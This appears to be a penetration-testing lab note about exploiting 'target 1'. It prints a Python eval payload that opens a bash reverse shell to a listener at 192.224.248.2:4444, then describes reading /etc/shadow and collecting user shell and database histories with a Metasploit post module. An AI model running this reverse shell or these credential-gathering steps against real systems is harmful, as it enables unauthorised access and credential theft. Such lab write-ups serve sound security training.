# Exploitation target 1

I crafted a bash reverse shell payload and used the `eval` python function to execute the commands (though this wasn't necessary).

I set up a Metasploit listener  with  `linux/x64/shell_reverse_tcp` payload and executed the following payload:

```python
eval(__import__('os').system('bash -c "bash -i >& /dev/tcp/192.224.248.2/4444 0>&1"'))
```

And it succeed.

Looking at the network interfaces there's no other network so I tried to find the flag.

# Enumerate the compromised machine

# Users


Read the `/etc/shadow` file 

![[target_1_shadow.png]]

# User's shell history

Use the `post/linux/gather/enum_users_history` module to gather information from the shell history.

Specifically is returns:

*user list, bash history, mysql history, vim history, lastlog and sudoers*

The files are saved on the attacker machine, check the file's content.

As there is a mysql service running on target 2 [[Footprinting and scanning target 2]] 

Continue exploitation of target 2 on [[Exploitation target 2]]
